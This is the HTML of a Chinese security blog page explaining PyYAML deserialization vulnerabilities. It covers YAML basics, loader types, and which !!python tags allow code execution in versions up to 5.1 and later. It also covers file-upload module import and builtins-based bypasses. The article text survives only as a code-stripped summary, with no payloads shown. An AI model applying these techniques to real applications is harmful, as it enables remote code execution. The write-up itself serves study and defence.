<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>PyYmal反序列化 | hybcx</title><meta name="keywords" content="基本知识"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="PyYmal反序列化"><meta name="application-name" content="PyYmal反序列化"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="PyYmal反序列化"><meta property="og:url" content="http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 YMAL简介 YAML是一种轻量级的数据序列化语言，它的名称是&amp;quot;YAML Ain’t Markup Language&amp;quot;的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。 YAML的语法非常简洁，使用缩进和特定的符号来表示数据结构。它支持多种数据类型，包括标量（字符串、数字、布尔值等"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 YMAL简介 YAML是一种轻量级的数据序列化语言，它的名称是&amp;quot;YAML Ain’t Markup Language&amp;quot;的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。 YAML的语法非常简洁，使用缩进和特定的符号来表示数据结构。它支持多种数据类型，包括标量（字符串、数字、布尔值等"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'PyYmal反序列化',
  postAI: '',
  pageFillDescription: '0x01 YMAL简介, 0x02 Yaml基本语法, 0x03 Yaml数据类型与结构, 0x04 反序列化漏洞成因, PyYamllt=5.1, yaml-gtpython, python-gtyaml, 漏洞成因–RCE, !!python/object标签, !!python/object/apply标签, !!python/object/new标签, !!python/module标签, !!python/name标签, 调试分析1, 调试分析2, payload总结, 漏洞成因–文件上传, !!python/module标签, 漏洞修复, PyYamlgt5.1, 漏洞成因, 漏洞利用, PyYamllt=5.1的poc, builtins模块中的内置函数, payload, 利用ruamel.yaml读写yaml文件, 0x05 参考文章简介是一种轻量级的数据序列化语言它的名称是的递归缩写它的设计目标是成为一种人类可读的数据交换格式的语法非常简洁使用缩进和特定的符号来表示数据结构它支持多种数据类型包括标量字符串数字布尔值等序列数组列表等和映射键值对还支持注释和引用可以使文档更易于理解和维护其文件一般以为后缀基本语法这里也就是纯了大小写敏感这两个对于来说是不同的变量使用缩进表示层级关系缩进不允许使用只允许空格缩进的空格数不重要只要相同层级的元素左对齐即可举个例子在这个示例中是一个映射类型包含四个键值对其中和都是映射类型和序列类型的嵌套结构使用缩进表示层级关系包含三个键值对包含一个序列其中包含三个元素表示注释但是只能支持单行注释注释注释一个文件中可以包含多个文件的内容用即三个破折号表示一份内容的开始用即三个小数点表示一份内容的结束非必需数据类型与结构标量标量是中的基本数据类型包括字符串整数浮点数布尔值等例如字符串整数可以支持二进制表示浮点数可以支持科学计数法布尔值均为空列表列表用短横线表示可以包含多个标量值形成一个有序的序列例如支持内敛格式用方括号包裹用逗号空格分隔例如支持多维数组用缩进表示层级关系例如映射映射用键值对表示使用冒号分隔键和值可以包含多个键值对形成一个无序的键值对集合例如支持流式风格的语法用花括号包裹用逗号空格分割例如可以使用声明一个复杂对象从而可以使用多个数组来组成键例如允许多层嵌套用缩进表示层级关系例如在这个示例中是一个映射类型包含一个键值对和一个键值对的值是一个映射类型包含一个键值对而的值又是一个映射类型包含一个键值对的值为多行字符串支持在标量值中使用多行字符串可以使用管道符或折叠式大于号来表示例如每行的缩进和行尾空白都会被去掉而额外的缩进会被保留只有空白行才会被识别为换行原来的换行符都会被转换成空格字符串一般不用引号包裹但是如果字符串中使用了反斜杠开头的转义字符就必须用引号包裹例如的编码的编码引用支持使用锚点和别名来创建引用可以在不同位置引用相同的值例如相当于可以利用锚点和别名以及合并标签将我们的变得更加整洁例如使用锚点和别名消除重复代码相当于时间戳在中可以使用格式的时间戳来表示日期和时间是一种国际标准用于表示日期时间和日期时间的格式例如类型转换支持使用严格类型标签双感叹号目标类型来强制转换类型例如使用显式类型转换将字符串转换成整数和浮点数使用显式类型转换将数字转换成字符串使用显式类型转换将字符串转换成布尔值使用显式类型转换将时间戳转换成日期时间使用显式类型转换将列表转换成其他类型反序列化漏洞成因在中的库中提供这几种方式实现和这两种语言的转换将对象转换为格式的方法它将对象序列化为格式的字符串并返回这个字符串在这个方法中是一个对象可以是字典列表元组整数浮点数字符串布尔值等基本数据类型也可以是自定义的类的实例举个例子输出结果在这段代码中我们定义了一个字典然后使用方法将对象序列为格式并赋值给最后打印出来得到我们最终的格式数据其实通俗点来说就是将的对象实例转化为格式的字符串也就是序列化如果我们的对象中包含自定义类的实例函数等那么使用方法进行序列化可能会导致安全问题攻击者可以通过在数据中注入恶意代码来执行任意代码从而导致应用程序受到攻击是将格式的字符串转换为对象的方法它将格式的字符串反序列化为对象并返回这个对象在这个方法中是一个包含格式字符串的变量可以是从文件中读取的字符串也可以是用户输入的字符串等这里看文章他只使用就能行但我这里必须添加解析器参数这段代码是将一个包含格式字符串的变量反序列化为对象并将其赋值给变量然后它打印出输出反序列化后的对象是将格式的字符串转换为对象的方法其中参数指定了解析器的类型在默认情况下方法使用的解析器是它可以安全地解析大多数格式数据但是不能解析包含对象的数据版本中提供了几个方法用于解析加载单个配置加载多个配置这里说明一下版本的都有哪些加载器版本一下默认此加载器在规范上新增了很多强制类型转换不支持强制类型转换支持强制类型转换和规范保持一致这里以默认的加载器为例示例代码自定义构造器函数获取类的属性值实例化类并设置属性将标签映射到自定义构造器函数定义一个包含自定义类实例的数据使用方法解析数据输出解析后的对象输出结果这里对于代码有许多不懂得地方结合理解一番首先看这行代码这里就是将标签映射到函数也就是说当我们在解析数据的时候如果遇到了标签那就会自动的去调用函数而函数有两个参数其中的参数实际代表着节点也就是标签所对应的节点在调用函数的时候会将节点赋值给接着通过函数获取节点中的属性值转换为字典的形式赋值给参数最后的时候实例化类将对应的键值传入该函数上面也提到过这里举个例子来理解是一个函数调用表达式其中是一个包含多个文档的字符串函数是模块中的一个方法用于从一个包含多个文档的字符串中解析出所有的文档并返回一个生成器对象每个元素都是一个对象对应一个文档定义包含两个文档的字符串使用方法解析所有的文档这里我仍然需要指定解析器参数遍历生成器对象并输出解析后的对象输出结果这段代码使用模块中的方法解析包含两个文档的字符串并输出每个文档解析后的对象是一个函数调用表达式其中是一个包含多个文档的字符串是模块中的一个解析器用于解析文档这里以默认的加载器为例示例代码定义包含两个文档的字符串使用方法解析所有的文档遍历生成器对象并输出解析后的对象输出结果这段代码使用模块中的方法解析包含两个文档的字符串并输出每个文档解析后的对象以上是版本中常见的一些方法实现和语言格式的转换的方法但是往往在这种语言格式的转换的同时也会存在一定的漏洞点的漏洞成因主要在的版本下默认为加载器但是经过审计模块中的的源码中存在对于的标签解析时的漏洞下面我们分析一下找一找在解析标签时的源码标签这里跟进包之后如上图的函数继续跟进可以找到处理标签的函数标签标签标签标签看上面前两个标签会发现都调用了这个函数方法所以我们接着往下看用于创建对象的实例对进行空值处理如果不存在将设置为空列表对进行空值处理如果不存在将设置为空字典利用定义的方法根据字符串和节点的起始标记查找对象的完整名称然后获取该对象的类对象如果参数为并且获取的对象不是类对象则抛出异常根据参数的值以及获取的类对象是否为类型对象选择使用方法或方法创建对象实例并将和参数传递给构造函数如果为且获取的类对象是类型对象则使用方法创建实例否则使用方法创建实例审计了一下函数可以发现这里是通过和参数动态的创建对象的实例所以我们是可以利用这个特点进行执行我们的恶意代码从而实现攻击我们可以发现在中又调用了函数接下来继续审计如果为空将会报错如果中包含将会对进行分割为模板名和对象名如果中没有则会将模板名命名为对象名命名为默认为所以可以利用将模块导入如果异常将会报错如果模块不在字典中将会报错使用函数查该模块是否包含了指定的对象名如果没有将报错利用函数获取返回值通过审计我们发现还可以通过引用的类创建对象从而执行我们的恶意代码实现攻击在上述代码看完之后我还是有很多不懂的点因此就想着直接看最终去调试分析这里明确的是标签并不能实现具体的下面分析但我们先分析剩下的可以实现的原因先看标签和标签因为这两个标签的处理方法一样就是值不一样我们看看最终是否会影响结果调试分析首先我们打一个端点进入调试步入之后我们跟进方法继续跟进之后我们来到下图位置你也可以稍作尝试会发现我们如果跟进方法的话才是有趣的接下来就是无脑跟进我们的重点就是观察其中参数值的变化尤其是关注与分别在哪写参数上如上图我们会看到已经跟进到处理这两个标签的关键函数了我们可以看一下各参数值如上图这里的为我们的也就是我们想要动态实例化的对象我们现在可以回顾一下我们之前写的我们是搞了个键值对标签对应这里我是觉得分析得不如因此我直接给的回答了重点分析给定的字符串的组成和语法结构进行详细解释如下是的标签前缀用于指定要应用的标签类型是标签值指定了要使用的构造器函数和模块路径在这里标签表示要应用一个函数是函数的路径表示要调用模块中的函数这是一个包含单个元素的列表这个列表是作为参数传递给构造器函数的参数列表综合起来给定的表达了一个数据结构它使用特定的标签和参数列表来构造一个对象具体地说它使用标签来调用函数将作为参数传递给该函数需要注意的是由于这个包含了敏感操作在实际使用中应谨慎处理以避免安全风险在加载和解析此类数据时应确保可信任的数据源和适当的安全措施说白了就是靠指定了构造器函数也就是我们默认的然后想要去调用函数并传入这个参数这样的话我们再继续看上述跟进到的位置很明显了就是被赋值为了函数没啥说的接下来可以看一下节点参数的内容对于为何参数是这样的内容是这样回答的对于给定的数据如果将其进行反序列化即使用适当的解析器进行加载则其中的节点将是一个包含以下内容的字典在这里是一个字典其中包含两个键值对键表示标签指示要实例化的对象类型在这种情况下标签为表示要使用类进行实例化键表示传递给构造函数的参数列表在此示例中是作为参数传递给构造函数的参数列表通过加载该数据并解析节点可以使用相应的构造器函数和参数来实例化类对象请注意由于该数据包含敏感操作在实际使用中应谨慎处理以避免安全风险好我们知道了上述参数的具体构成接下来继续跟进如果我们尝试过就知道这里需要跟进一下来看看具体的函数逻辑如上图跟进之后看到这个函数首先判断的类型是否是如果不是则报错否则通过语句提取出中的值然后返回而我们知道其中的值有一个这很有趣继续跟进这里发现最终的值成了如上图该函数在处理的时候判断其是否是实例但根据值我们知道肯定不是于是直接跳到语句上述语句继续跟进函数的话会到达上图因为是实例于是他就直接返回的但这里我有点懵我想知道先前的第一个去哪了所以我们重新调试一下看看我们重新调试跟进到上方突然就知道什么鬼了之前就没注意这里经过循环将给了但他的是当初我还以为是两个结果这里是的嵌套继续跟进就顿悟了如上图可以看到这里是将参数值传入给了因此这里的成了上面的值所以在下图我们的也就是之前的经过处理又取得他的值也就是这里继续无脑跟进一波到达函数跟进到如下图发现有调用了函数接续跟进继续跟进如下图这里的的值赋给了的给了继续跟进发现对做了针对处理首先通过的符号将分隔开然后通过导入了模块随后判断模块是否在的模块中但很显然是在的最后通过获取模块里面的方法最后的值就是我们的类最后通过语句的判断来决定是通过来实例化对象还是直接调用类的构造函数来实例化显然其中的是且最终是直接调用构造函数来实例化的至于为空继续跟进就会发现弹出计算器了至此分析完毕这里的函数是来判断是否为类对象但我们最后的是是一个函数显然肯定不会进入语句由此可以知道为何与标签的处理方法一致调试分析这里可以分析剩下的三个标签了如果你执行会发现没办法进行我们跟进看看为何针对上面代码我们继续调试跟进到下方进入函数看看进入该函数之前我认为可以与上述的标签对比一下就知道不同之处了上述两个成功的标签对了一个对参数的处理如上图所示这最终会导致被赋值为但对于标签来说他们没有对参数的处理如果我们跟进会发现如下图的情况会发现被默认赋值为了导致最终的没有参数传入也就无法剩下的两个与标签都是这样的情况不再赘述了至此全部分析完毕最终能导致的标签就只有标签这里给几个常见总结给出一些相同用法的这里将与字符替换即可使用漏洞成因文件上传标签原理利用现有文件上传或者写文件的功能传入一个写入命令执行代码的文件将文件名写入标签中当该标签被反序列化时就可以顺利导入该文件作为模块执行当中的命令文件名如果在另一文件中依次运行以下代码方法是随意写的是不存在的但必须要有因为这是命名规则不然会报错主要是文件名要写对都能成功弹出计算器当然和也可以用这种方式实现利用如果我们调试分析就知道最终的会被赋值为而被导入导入之后其中的代码也会被执行进而弹出计算器以上要求是在同一目录下如果不在同一目录下怎么办好比如这种情况那稍作修改在文件名前加入目录名可经过测试只有标签可行这里只要调试一下就知道问题出在哪里在与的标签处理中对于对应函数的处理中标签没有经过函数的处理而经过了当然文件名写成将会更简单只需目录即可而且和两个标签也可以构造利用了表示着类实例可以写成其他虽不存在但是一定要有否则报错漏洞修复大于的版本打了补丁这里懒得找了就直接文章通过调试发现方法还有方法也一样增加了一个默认为的值就无法直接最终会报错这里查看是不是在字典里不是就会进入直接报错接下来执行这一段在的库中提供以下方法将和进行语言格式转换在的版本之后如果要使用函数要跟上一个的参数否则会报错不影响正常输出真尴尬感情我上面分析了半天用的都是的版本但竟然能复现成这里其实和版本一样就不多赘述这里说明一下都有哪些加载器不支持强制类型转换安全地加载格式的数据限制被加载的数据中可用的对象类型从而防止执行危险的操作或代码加载包含任意对象的数据加载器不会限制被加载的数据中可用的对象类型因此可以加载包含任意对象的数据加载包含任意对象的数据并且不会对被加载的数据中可用的对象类型进行任何限制以为例示例代码以加载器为例示例代码第一个文档第二个文档输出结果这里其实和函数一样就不多赘述了与函数的区别是使用作为默认解析器所以说这是一个相对安全的解析器它限制了可以执行的代码的类型示例代码输出结果与函数类似但可以处理包含多个文档的数据流示例代码输出结果函数可以加载包含自定义对象的数据允许加载和执行任意代码并尝试将它们反序列化为实际的对象存在安全隐患示例代码输出结果相比用于将多个文档加载为对象的生成器示例代码输出结果漏洞成因这里的漏洞成因和一样都是中的一些不严谨的代码引起的漏洞漏洞利用我这里选用测试的版本是版本在的版本之后这个加载器对于的限制比较多了我们延用的还是可以的只不过要修改一下我们还可以利用内置的模块因为之前我们审计时发现定义的中如果不用将模块名和对象名分开会默认调用模块的模块中的内置函数是的内建模块所谓内建模块就是你在使用时不需要在启动后在没有执行程序员编写的任何代码前会加载内建模块中的函数到内存中发现在处理不带也就是为空的情况下自动默认为并且该模块是在中的首先我们先明确中的所有的类从而筛选出可以利用的类现在就是找可以利用的类了继续回到我们的中进一步审计时发现了一个漏洞点如果不为空则调用的方法将中的所有元素添加到列表对象的末尾是我们创建的实例这里并没有定义是什么如果我们的是一个字典而且其内容有这样的话我们就可以利用进行任意函数的执行了但是经过测试发现上面中的这些类中只有这三个类可以进行命令执行为了搞清楚为什么我们继续审计源码我们接着看这里只要我们的内置类可以执行这段代码就可以根据参数来动态创建新的对象从而进行命令执行所以猜测应该是可以执行上述代码所以可以进行命令执行的发现都是有回显的这里顺便附上一些文章找到的供大家使用报错但是执行了创建了一个类型为的新对象而对象中属性在创建时会被调用参数为内的参数我们可以用的内置函数或者来执行代码用来触发函数执行用将对象转化为元组输出来当然用都可以用写出来如下变为当利用上述测试到版本时发现无法利用针对标签的了别的都可以利用上述当我测试到版本时发现只有利用针对标签的可以命令执行别的都不能用了一些高版本的绕过方式由于不是很常见这里就不多介绍了当版本大于等于当版本大于等于利用读写文件在网上搜资料的时候发现了也可以利用读写文件所以我在想是不是也存在反序列化漏洞进行测试一下这里还是沿用的下运行参考文章反序列化漏洞浅谈反序列化漏洞反序列化漏洞详解反序列化',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-03-23 22:20:54',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 